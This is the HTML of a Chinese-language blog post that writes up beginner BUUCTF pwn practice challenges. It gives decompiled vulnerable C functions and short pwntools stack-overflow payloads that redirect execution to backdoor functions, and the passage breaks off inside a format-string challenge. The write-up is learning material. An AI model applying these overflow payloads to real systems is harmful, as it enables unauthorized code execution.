@@ -1,0 +1,1357 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TY">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Record the learning of pwn on buu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN-BUUCTF-1">
+<meta property="og:url" content="https://tforevery.github.io/PWN/BUUCTF/PWN-BUUCTF-1/index.html">
+<meta property="og:site_name" content="TY&#39;s Blog">
+<meta property="og:description" content="Record the learning of pwn on buu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tforevery.github.io/Images/1752484311032-b48ebb94-362b-4978-b0b1-72389fe001cc.png">
+<meta property="article:published_time" content="2025-04-01T05:11:53.000Z">
+<meta property="article:modified_time" content="2025-12-23T17:10:28.403Z">
+<meta property="article:author" content="TY">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tforevery.github.io/Images/1752484311032-b48ebb94-362b-4978-b0b1-72389fe001cc.png">
+  
+  
+  
+  <title>PWN-BUUCTF-1 - TY&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tforevery.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"4pk0DV0Gzc6TMpnuyhQwgcgs-gzGzoHsz","app_key":"4MnQ5z5ovVgFNdAOxLy5UlVV","server_url":"https://4pk0dv0g.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TY</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PWN-BUUCTF-1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-01 13:11" pubdate>
+          2025年4月1日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          39 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="PWN"
+        id="heading-9ff4c26c1ae7cc7c11352087a2fa7ed2" role="tab" data-toggle="collapse" href="#collapse-9ff4c26c1ae7cc7c11352087a2fa7ed2"
+        aria-expanded="true"
+      >
+        PWN
+        <span class="list-group-count">(12)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-9ff4c26c1ae7cc7c11352087a2fa7ed2"
+           role="tabpanel" aria-labelledby="heading-9ff4c26c1ae7cc7c11352087a2fa7ed2">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="BUUCTF"
+        id="heading-20cbba83d944fc64ea203deb4df2127a" role="tab" data-toggle="collapse" href="#collapse-20cbba83d944fc64ea203deb4df2127a"
+        aria-expanded="true"
+      >
+        BUUCTF
+        <span class="list-group-count">(4)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-20cbba83d944fc64ea203deb4df2127a"
+           role="tabpanel" aria-labelledby="heading-20cbba83d944fc64ea203deb4df2127a">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-1/" title="PWN-BUUCTF-1"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">PWN-BUUCTF-1</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-2/" title="PWN-BUUCTF-2"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">PWN-BUUCTF-2</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-3/" title="PWN-BUUCTF-3"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">PWN-BUUCTF-3</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-4/" title="PWN-BUUCTF-4"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">PWN-BUUCTF-4</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HEAP"
+        id="heading-b6722804f5872cdd88347da194d42087" role="tab" data-toggle="collapse" href="#collapse-b6722804f5872cdd88347da194d42087"
+        aria-expanded="false"
+      >
+        HEAP
+        <span class="list-group-count">(7)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-b6722804f5872cdd88347da194d42087"
+           role="tabpanel" aria-labelledby="heading-b6722804f5872cdd88347da194d42087">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/PWN/HEAP/Heap-block-overlap/" title="Heap block overlap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Heap block overlap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/House-Of-Force/" title="House Of Force"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">House Of Force</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/House-Of-Spirit/" title="House Of Spirit"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">House Of Spirit</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/Off-By-One/" title="Off By One"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Off By One</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/UAF/" title="UAF"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">UAF</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/Unlink/" title="Unlink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Unlink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/Unsorted-bin-Attack/" title="Unsorted bin Attack"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Unsorted bin Attack</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="STACK"
+        id="heading-0fac686d86aba414411b58f6bce53a76" role="tab" data-toggle="collapse" href="#collapse-0fac686d86aba414411b58f6bce53a76"
+        aria-expanded="false"
+      >
+        STACK
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-0fac686d86aba414411b58f6bce53a76"
+           role="tabpanel" aria-labelledby="heading-0fac686d86aba414411b58f6bce53a76">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/PWN/STACK/Stack-pivoting/" title="Stack pivoting"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Stack pivoting</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PWN-BUUCTF-1</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年12月24日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a><font style="color:rgb(33, 37, 41);">test_your_nc</font></h1><blockquote>
+<p>连上就有shell</p>
+</blockquote>
+<blockquote>
+<p>考点</p>
+<ul>
+<li>命令执行<ul>
+<li>cat</li>
+<li>nc</li>
+</ul>
+</li>
+</ul>
+<p>利用nc链接到目标靶机</p>
+<p>利用cat命令将文件内容输出到终端上</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../../Images/1752484311032-b48ebb94-362b-4978-b0b1-72389fe001cc.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a><font style="color:rgb(33, 37, 41);">rip</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>后门+64位栈溢出</li>
+<li>栈平衡</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char s[<span class="hljs-number">15</span>]; // [rsp+1h] [rbp-Fh] BYREF<br><br>  puts(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv);<br>  puts(s);<br>  puts(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-built_in">int</span> fun()<br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xf</span>+<span class="hljs-number">8</span>) + p64(elf.sym[<span class="hljs-string">&#x27;fun&#x27;</span>]+<span class="hljs-number">1</span>)<br><span class="hljs-comment">## 等价于 payload = b&#x27;a&#x27;*(0xf+8) + p64(0x401186+1)</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a><font style="color:rgb(33, 37, 41);">warmup_csaw_2016</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>后门+64位栈溢出</li>
+<li>数据获取</li>
+<li>重复利用函数</li>
+<li>栈平衡</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">__int64 __fastcall main(<span class="hljs-built_in">int</span> a1, char **a2, char **a3)<br>&#123;<br>  char s[<span class="hljs-number">64</span>]; // [rsp+0h] [rbp-80h] BYREF<br>  _BYTE v5[<span class="hljs-number">64</span>]; // [rsp+40h] [rbp-40h] BYREF<br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;-Warm Up-\n&quot;</span>, 0xAuLL);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;WOW:&quot;</span>, 4uLL);<br>  sprintf(s, <span class="hljs-string">&quot;%p\n&quot;</span>, sub_40060D);<br>  write(<span class="hljs-number">1</span>, s, 9uLL);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, 1uLL);<br>  <span class="hljs-keyword">return</span> gets(v5);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x040061D</span>+<span class="hljs-number">1</span>)<br><span class="hljs-comment">## 等价于 payload = b&#x27;a&#x27;*(0x40+8) + p(elf.sym[&#x27;main&#x27;]+1)，但是这个程序没有静态符号，导致无法使用这个代码</span><br>sendlineafter(<span class="hljs-string">&#x27;WOW:&#x27;</span>,payload)<br>backdoor = <span class="hljs-built_in">int</span>(recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>log.success(<span class="hljs-built_in">hex</span>(backdoor))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(backdoor+<span class="hljs-number">1</span>)<br>sendline(payload)<br><br><span class="hljs-comment"># 数据提取有很多中方式</span><br><span class="hljs-comment">## 通过sendlineafter接受到指定字符串后发送，那么到指定字符串前所有无用字符都会被过滤掉</span><br><span class="hljs-comment">## 通过recvuntil(str)抛弃指定str（包括str）之前的所有字符，实现效果是一样的</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_n_1</font></h1><blockquote>
+<p>两种解法</p>
+<ul>
+<li>直接栈溢出到shell上</li>
+<li>完成判断语句</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>考点</p>
+<ul>
+<li>栈溢出</li>
+<li>小数转换</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> func()<br>&#123;<br>  _BYTE v1[<span class="hljs-number">44</span>]; // [rsp+0h] [rbp-30h] BYREF<br>  <span class="hljs-built_in">float</span> v2; // [rsp+2Ch] [rbp-4h]<br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  puts(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 溢出到shell上</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x004006BE</span>)<br><br><span class="hljs-comment">## 完成判断语句 struct.pack(&#x27;&gt;f&#x27;, 11.28125).hex()</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p32(<span class="hljs-number">0x41348000</span>)<br></code></pre></td></tr></table></figure>
+
+<h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a><font style="color:rgb(33, 37, 41);">pwn1_sctf_2016</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>栈溢出+后门<ul>
+<li>程序指定栈溢出规则（一个字符替换成三个字符）</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vuln()<br>&#123;<br>  const char *src; // eax<br>  char s[<span class="hljs-number">32</span>]; // [esp+1Ch] [ebp-3Ch] BYREF<br>  _BYTE v3[<span class="hljs-number">4</span>]; // [esp+3Ch] [ebp-1Ch] BYREF<br>  _BYTE v4[<span class="hljs-number">7</span>]; // [esp+40h] [ebp-18h] BYREF<br>  char v5; // [esp+47h] [ebp-11h] BYREF<br>  _BYTE v6[<span class="hljs-number">7</span>]; // [esp+48h] [ebp-10h] BYREF<br>  _BYTE v7[<span class="hljs-number">5</span>]; // [esp+4Fh] [ebp-9h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  fgets(s, <span class="hljs-number">0x20</span>, edata);<br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, s);<br>  std::allocator&lt;char&gt;::allocator(&amp;v5);<br>  std::string::string(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;char&gt;::allocator(v7);<br>  std::string::string(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  (replace)(v3);<br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, v3, v6, v4);<br>  std::string::~string(v3);<br>  std::string::~string(v6);<br>  std::allocator&lt;char&gt;::~allocator(v7);<br>  std::string::~string(v4);<br>  std::allocator&lt;char&gt;::~allocator(&amp;v5);<br>  src = std::string::c_str(&amp;<span class="hljs-built_in">input</span>);<br>  strcpy(s, src);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span>*<span class="hljs-number">20</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + p32(elf.sym[<span class="hljs-string">&#x27;get_flag&#x27;</span>])<br></code></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level0</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>后门+64位栈溢出</li>
+<li>栈平衡</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, 0xDuLL);<br>  <span class="hljs-keyword">return</span> vulnerable_function(1LL);<br>&#125;<br><br><br>ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">128</span>]; // [rsp+0h] [rbp-80h] BYREF<br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x200uLL);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span> + p64(elf.sym[<span class="hljs-string">&#x27;callsystem&#x27;</span>]+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a><font style="color:rgb(33, 37, 41);">[第五空间2019 决赛]PWN5</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>fmt<ul>
+<li>泄露数据+获取数据</li>
+<li>修改任意地址数据</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> a1)<br>&#123;<br>  time_t seed; // eax<br>  <span class="hljs-built_in">int</span> result; // eax<br>  <span class="hljs-built_in">int</span> fd; // [esp+0h] [ebp-84h]<br>  char nptr[<span class="hljs-number">16</span>]; // [esp+4h] [ebp-80h] BYREF<br>  char buf[<span class="hljs-number">100</span>]; // [esp+14h] [ebp-70h] BYREF<br>  unsigned <span class="hljs-built_in">int</span> v6; // [esp+78h] [ebp-Ch]<br>  <span class="hljs-built_in">int</span> *v7; // [esp+7Ch] [ebp-8h]<br><br>  v7 = &amp;a1;<br>  v6 = __readgsdword(0x14u);<br>  setvbuf(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  seed = time(<span class="hljs-number">0</span>);<br>  srand(seed);<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  read(fd, &amp;buf_, 4u);<br>  printf(<span 